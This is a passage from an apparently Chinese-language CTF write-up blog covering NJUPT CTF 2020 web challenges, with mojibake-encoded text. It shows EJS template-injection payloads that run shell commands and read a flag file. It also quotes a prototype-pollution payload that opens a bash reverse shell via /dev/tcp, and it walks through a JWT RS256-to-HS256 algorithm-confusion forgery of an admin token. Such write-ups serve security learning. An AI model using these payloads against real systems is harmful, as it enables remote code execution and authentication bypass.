punctuation">(</span><span class="token function">session</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    name<span class="token operator">:</span> <span class="token string">'session'</span><span class="token punctuation">,</span>    secret<span class="token operator">:</span> <span class="token string">'T0pSsssecRet233#@###'</span><span class="token punctuation">,</span>    store<span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">FileStore</span><span class="token punctuation">(</span><span class="token punctuation">{</span>path<span class="token operator">:</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">"sessions"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    resave<span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>    saveUninitialized<span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">{</span> extended<span class="token operator">:</span> <span class="token boolean">false</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">cookieParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token constant">KEY</span><span class="token operator">=</span> process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">KEY</span> <span class="token operator">||</span> <span class="token string">"r5NmfIzU1uzl6Wp"</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token function-variable function">xor</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">secretkey<span class="token punctuation">,</span>value</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token class-name">Array</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>  <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">chr<span class="token punctuation">,</span>index</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>secretkey<span class="token punctuation">[</span>index <span class="token operator">%</span> secretkey<span class="token punctuation">.</span>length<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">^</span> chr<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span> <span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span>res</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> session<span class="token operator">=</span>req<span class="token punctuation">.</span>session<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>session<span class="token punctuation">.</span>AccessGranted <span class="token operator">===</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        session<span class="token punctuation">.</span>AccessGranted<span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>     <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/templates'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span>res</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> session <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>session<span class="token punctuation">.</span>AccessGranted <span class="token operator">!==</span> <span class="token string">"undefined"</span> <span class="token operator">&amp;&amp;</span> session<span class="token punctuation">.</span>AccessGranted <span class="token operator">===</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">try</span><span class="token punctuation">{</span>            <span class="token keyword">let</span> template_path <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">"templates/"</span><span class="token punctuation">,</span> session<span class="token punctuation">.</span>id<span class="token punctuation">,</span> <span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span>template_path<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">throw</span> err<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Not Accessible Now.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/create'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span>res</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> session <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>session<span class="token punctuation">.</span>AccessGranted <span class="token operator">!==</span> <span class="token string">"undefined"</span> <span class="token operator">&amp;&amp;</span> session<span class="token punctuation">.</span>AccessGranted <span class="token operator">===</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">try</span><span class="token punctuation">{</span>            <span class="token keyword">const</span> id <span class="token operator">=</span> session<span class="token punctuation">.</span>id<span class="token punctuation">;</span>            <span class="token keyword">const</span> raw <span class="token operator">=</span> Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>code<span class="token punctuation">,</span> <span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">const</span> contents <span class="token operator">=</span> <span class="token function">xor</span><span class="token punctuation">(</span><span class="token constant">KEY</span><span class="token punctuation">,</span>raw<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">let</span> template_path <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname <span class="token punctuation">,</span> <span class="token string">"/views/templates/"</span><span class="token punctuation">,</span> id<span class="token punctuation">,</span> <span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>fs<span class="token punctuation">.</span><span class="token function">existsSync</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname <span class="token punctuation">,</span> <span class="token string">"/views/templates/"</span><span class="token punctuation">,</span> id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                fs<span class="token punctuation">.</span><span class="token function">mkdirSync</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname <span class="token punctuation">,</span> <span class="token string">"/views/templates/"</span><span class="token punctuation">,</span> id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            fs<span class="token punctuation">.</span><span class="token function">writeFileSync</span><span class="token punctuation">(</span>template_path<span class="token punctuation">,</span> contents<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'done'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">throw</span> err<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Not Accessible Now.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">all</span><span class="token punctuation">(</span><span class="token string">'*'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'404 page not found'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">8088</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Listening on port 8088'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>è€Œåæ‰¾ flag å°±å¥½äº†ã€‚</p><pre class="language-none"><code class="language-none">var payload = "&lt;%- global.process.mainModule.require('child_process').execSync('ls -alh') %&gt;"total 92K    drwxr-xr-x    1 root     root        4.0K Nov 17 11:29 .drwxr-xr-x    1 root     root        4.0K Nov 21 00:55 ..-rw-r--r--    1 root     root        2.6K Nov 17 11:10 app.jsdrwxr-xr-x   95 root     root        4.0K Nov 17 11:29 node_modules-rw-r--r--    1 root     root       24.9K Nov 17 11:29 package-lock.json-rw-r--r--    1 root     root         447 Nov 17 11:10 package.jsondrwxr-xr-x    6 root     root        4.0K Nov 17 11:10 publicdrwxr-xr-x    1 nobody   nobody     24.0K Nov 21 18:02 sessionsdrwxr-xr-x    1 root     root        4.0K Nov 17 11:10 viewsvar payload = "&lt;%- global.process.mainModule.require('child_process').execSync('ls / -alh') %&gt;"drwxr-xr-x    1 root     root        4.0K Nov 21 00:55 .drwxr-xr-x    1 root     root        4.0K Nov 21 00:55 ..-rwxr-xr-x    1 root     root           0 Nov 21 00:55 .dockerenvdrwxr-xr-x    1 root     root        4.0K Nov 17 11:29 appdrwxr-xr-x    1 root     root        4.0K Nov 16 23:22 bindrwxr-xr-x    5 root     root         340 Nov 21 06:12 devdrwxr-xr-x    1 root     root        4.0K Nov 21 00:55 etc-rw-r--r--    1 node     node          32 Nov 18 01:51 flag.txtdrwxr-xr-x    1 root     root        4.0K Nov 16 23:22 homedrwxr-xr-x    1 root     root        4.0K Nov 16 23:22 libdrwxr-xr-x    5 root     root        4.0K Apr 23  2020 mediadrwxr-xr-x    2 root     root        4.0K Apr 23  2020 mntdrwxr-xr-x    1 root     root        4.0K Nov 16 23:22 optdr-xr-xr-x  357 root     root           0 Nov 21 06:12 procdrwx------    1 root     root        4.0K Nov 17 11:29 rootdrwxr-xr-x    2 root     root        4.0K Apr 23  2020 rundrwxr-xr-x    2 root     root        4.0K Apr 23  2020 sbindrwxr-xr-x    2 root     root        4.0K Apr 23  2020 srvdr-xr-xr-x   13 root     root           0 Nov 21 06:12 sysdrwxrwxrwt    1 root     root        4.0K Nov 16 23:22 tmpdrwxr-xr-x    1 root     root        4.0K Nov 16 23:22 usrdrwxr-xr-x    1 root     root        4.0K Apr 23  2020 var</code></pre><p><img src="/2020/11/23/CTF_2020NJUPTCTF/image-20201122022551852.png" alt="console é‡Œæ‰§è¡Œ"></p><p>æœ€åè¯» flagã€‚</p><pre class="language-none"><code class="language-none">var payload = "&lt;%- global.process.mainModule.require('child_process').execSync('cat /flag.txt') %&gt;"NCTF{Welcome_to_The_js_W0rld:)}</code></pre><p><img src="/2020/11/23/CTF_2020NJUPTCTF/image-20201122022914243.png" alt="flag"></p><blockquote><p>BTW, <a href="https://www.pianshen.com/article/75781782565/">CVE-2020-7699ï¼šNodeJSæ¨¡å—ä»£ç æ³¨å…¥</a>ï¼Œexpress-fileupload npmç»„ä»¶ã€‚</p><p><a href="https://www.anquanke.com/post/id/193939">D^3CTF å®˜æ–¹WriteUp â€”â€” ejs getshell</a></p><p><img src="/2020/11/23/CTF_2020NJUPTCTF/image-20201122023322369.png"></p><p>ä»–çš„è„šæœ¬å¦‚ä¸‹ã€‚ï¼ˆå¥½å®¶ä¼™ï¼Œç›´æ¥ getshellã€‚</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token property">"constructor"</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token property">"prototype"</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token property">"outputFunctionName"</span><span class="token operator">:</span> <span class="token string">"a; return global.process.mainModule.constructor._load('child_process').execSync('bash -c "</span>/bin/bash -i &gt; /dev/tcp/ip/port <span class="token number">0</span>&lt;&amp;<span class="token number">1</span> <span class="token number">2</span>&gt;&amp;<span class="token number">1</span><span class="token string">"'); //"</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre></blockquote><h3 id="PackageManager-v1-0"><a href="#PackageManager-v1-0" class="headerlink" title="PackageManager_v1.0"></a>PackageManager_v1.0</h3><blockquote><p>Admin uses this api server to manage his package . Definitely no way to RCE.</p><p>Please make sure you can exploit it locally fisrt.</p><p>all packages are up to date</p><p>source code: é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/19fm5JUvpjPEUVs528qRDSw">https://pan.baidu.com/s/19fm5JUvpjPEUVs528qRDSw</a> æå–ç ï¼štxai</p></blockquote><p>å®¡é˜…æºç ï¼Œåœ¨ <code>router/index.js</code> é‡Œå¤„ç†è·¯ç”±ã€‚</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span>res</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/api/package'</span><span class="token punctuation">,</span> <span class="token keyword">async</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> token <span class="token operator">=</span> req<span class="token punctuation">.</span>cookies<span class="token punctuation">[</span><span class="token string">'auth'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> token <span class="token operator">==</span> <span class="token keyword">undefined</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>        user<span class="token operator">=</span><span class="token punctuation">{</span> username <span class="token operator">:</span> <span class="token string">"guest"</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>        token<span class="token operator">=</span><span class="token keyword">await</span> <span class="token constant">JWT</span><span class="token punctuation">.</span><span class="token function">sign</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>        res<span class="token punctuation">.</span><span class="token function">cookie</span><span class="token punctuation">(</span><span class="token string">'auth'</span><span class="token punctuation">,</span> token<span class="token punctuation">,</span> <span class="token punctuation">{</span> httpOnly<span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span><span class="token punctuation">{</span> author <span class="token operator">:</span> <span class="token keyword">package</span><span class="token punctuation">.</span>author <span class="token punctuation">,</span> description <span class="token operator">:</span> <span class="token keyword">package</span><span class="token punctuation">.</span>description <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/api/package'</span><span class="token punctuation">,</span>AuthMiddlerware<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span>res</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>    <span class="token keyword">let</span> newpackage<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>    newpackage<span class="token operator">=</span>rep<span class="token punctuation">.</span><span class="token function">replicate</span><span class="token punctuation">(</span>newpackage<span class="token punctuation">,</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span><span class="token punctuation">{</span> author <span class="token operator">:</span> newpackage<span class="token punctuation">.</span>author <span class="token punctuation">,</span> description <span class="token operator">:</span> newpackage<span class="token punctuation">.</span>description <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//only for self debugging</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/debug/:command'</span><span class="token punctuation">,</span> AuthMiddlerware<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span>res</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span><span class="token punctuation">{</span>    <span class="token keyword">let</span> command<span class="token operator">=</span> req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>command<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>command <span class="token operator">==</span> <span class="token string">'cwd'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">let</span> proc <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token string">'./checkcwd.js'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>                 stdio<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'ignore'</span><span class="token punctuation">,</span> <span class="token string">'pipe'</span><span class="token punctuation">,</span> <span class="token string">'pipe'</span><span class="token punctuation">,</span> <span class="token string">'ipc'</span><span class="token punctuation">]</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            proc<span class="token punctuation">.</span>stderr<span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>            proc<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>         <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Invalid command'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'No command specified.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>å‘ç° GET è¯·æ±‚ <code>/api/package</code>è¿™é‡Œç”¨åˆ°äº† JWT é‰´æƒï¼Œå…³é”®çš„éƒ¨åˆ†å¦‚ä¸‹ã€‚</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token keyword">async</span> <span class="token function">sign</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        data <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">assign</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token punctuation">{</span> pk <span class="token operator">:</span> publicKey <span class="token punctuation">}</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">await</span> jwt<span class="token punctuation">.</span><span class="token function">sign</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> privateKey<span class="token punctuation">,</span> <span class="token punctuation">{</span> algorithm<span class="token operator">:</span><span class="token string">'RS256'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token keyword">async</span> <span class="token function">decode</span><span class="token punctuation">(</span><span class="token parameter">token</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">await</span> jwt<span class="token punctuation">.</span><span class="token function">verify</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> publicKey<span class="token punctuation">,</span> <span class="token punctuation">{</span> algorithms<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'RS256'</span><span class="token punctuation">,</span> <span class="token string">'HS256'</span><span class="token punctuation">]</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>å¯ä»¥çœ‹åˆ°æŠŠå…¬é’¥åŒ…å«åˆ°äº† JWT ä¸­ï¼Œè€Œä¸”è§£å¯†çš„æ—¶å€™èƒ½å¤Ÿç”¨ HS256 ç®—æ³•ï¼Œäºæ˜¯å‚è€ƒ <a href="https://miaotony.xyz/2020/11/08/CTF_2020Hackergame/#%E6%99%AE%E9%80%9A%E7%9A%84%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E5%99%A8">Hackergame2020 æ™®é€šçš„èº«ä»½è®¤è¯å™¨</a> ä¸€é¢˜ï¼Œ<strong>å°† RS256 é™çº§ä¸º HS256</strong>ã€‚ <em>ï¼ˆå¼•ç”¨è‡ªå·±ä¹‹å‰çš„ WPï¼Œè®²ç©¶</em></p><p>é¦–å…ˆè·å– cookieã€‚</p><pre class="language-none"><code class="language-none">eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwicGsiOiItLS0tLUJFR0lOIFBVQkxJQyBLRVktLS0tLVxuTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FEb0RHcEhrYW9LTGVKWEhIblFVRjF0K2FuWFxucWlyNzlZajN2ZkRGVE9wNnFobDZHc255dWNFZGlDSTF6M2xpZEoycGQxbWpUN2t3M2lzTlY2R2taV28yaS9VWVxuT1Zsa0lhV1dEd3RKTXVKdVNsRTR0M3p1WU0wRFlOVEZFelM1akYvUmwzY05MU0J0R2xlb2JtMXFFS0gvZUFnS1xub3NYZWZudEZ5UFlhdm4vdUlRSURBUUFCXG4tLS0tLUVORCBQVUJMSUMgS0VZLS0tLS1cbiIsImlhdCI6MTYwNjAzNzIxMn0.002iwHbUK25horYZdXwN2c9mxu9ak-258TcHRo2NbCjERbzSZCQea_wfgyuYQkAoE1uurJ0dLCJw4Ozi-iXN6KA92UpgHUX0voNLYtcQENNqMTwyKldUztu6AR9eqdhftLTOLDWuIylqjoPkQA7pFYJXx2yfh5UkEqWW6arFTZs</code></pre><p>base64 è§£å¯†ï¼Œå–å¤´éƒ¨ Headerã€è½½è· Payloadã€‚</p><pre class="language-none"><code class="language-none">{"alg":"RS256","typ":"JWT"}.{"username":"guest","pk":"-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDoDGpHkaoKLeJXHHnQUF1t+anX\nqir79Yj3vfDFTOp6qhl6GsnyucEdiCI1z3lidJ2pd1mjT7kw3isNV6GkZWo2i/UY\nOVlkIaWWDwtJMuJuSlE4t3zuYM0DYNTFEzS5jF/Rl3cNLSBtGleobm1qEKH/eAgK\nosXefntFyPYavn/uIQIDAQAB\n-----END PUBLIC KEY-----\n","iat":1606037212}</code></pre><p>ä¿®æ”¹åŠ å¯†ç®—æ³•ï¼Œ<code>username</code>æ”¹ä¸º <code>admin</code>ã€‚</p><p>å† base64 åŠ å¯†ï¼Œå»é™¤ <code>=</code>ï¼Œå¾—åˆ°</p><pre class="language-none"><code class="language-none">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGsiOiItLS0tLUJFR0lOIFBVQkxJQyBLRVktLS0tLVxuTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FEb0RHcEhrYW9LTGVKWEhIblFVRjF0K2FuWFxucWlyNzlZajN2ZkRGVE9wNnFobDZHc255dWNFZGlDSTF6M2xpZEoycGQxbWpUN2t3M2lzTlY2R2taV28yaS9VWVxuT1Zsa0lhV1dEd3RKTXVKdVNsRTR0M3p1WU0wRFlOVEZFelM1akYvUmwzY05MU0J0R2xlb2JtMXFFS0gvZUFnS1xub3NYZWZudEZ5UFlhdm4vdUlRSURBUUFCXG4tLS0tLUVORCBQVUJMSUMgS0VZLS0tLS1cbiIsImlhdCI6MTYwNjAzNzIxMn0</code></pre><p>ç»“åˆå…¬é’¥è®¡ç®—åŠ å¯†æ‰€ç”¨çš„<strong>ç­¾åï¼ˆSignatureï¼‰</strong>ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">echo</span> -n <span class="token string">"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGsiOiItLS0tLUJFR0lOIFBVQkxJQyBLRVktLS0tLVxuTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FEb0RHcEhrYW9LTGVKWEhIblFVRjF0K2FuWFxucWlyNzlZajN2ZkRGVE9wNnFobDZHc255dWNFZGlDSTF6M2xpZEoycGQxbWpUN2t3M2lzTlY2R2taV28yaS9VWVxuT1Zsa0lhV1dEd3RKTXVKdVNsRTR0M3p1WU0wRFlOVEZFelM1akYvUmwzY05MU0J0R2xlb2JtMXFFS0gvZUFnS1xub3NYZWZudEZ5UFlhdm4vdUlRSURBUUFCXG4tLS0tLUVORCBQVUJMSUMgS0VZLS0tLS1cbiIsImlhdCI6MTYwNjAzNzIxMn0"</span> <span class="token operator">|</span> openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d2d2d424547494e205055424c4943204b45592d2d2d2d2d0a4d4947664d413047435371475349623344514542415155414134474e4144434269514b426751446f444770486b616f4b4c654a5848486e51554631742b616e580a7169723739596a3376664446544f703671686c3647736e7975634564694349317a336c69644a327064316d6a54376b773369734e5636476b5a576f32692f55590a4f566c6b496157574477744a4d754a75536c453474337a75594d3044594e5446457a53356a462f526c33634e4c534274476c656f626d3171454b482f6541674b0a6f735865666e744679505961766e2f7549514944415141420a2d2d2d2d2d454e44205055424c4943204b45592d2d2d2d2d0a<span class="token punctuation">(</span>stdin<span class="token punctuation">)</span><span class="token operator">=</span> 2eeceba7b1828a217aa00ca6795bcaa1ca2f2391e731362b1f5ac1084f11966d</code></pre><p>è½¬æ¢ä¸º JWT formatã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ python -c <span class="token 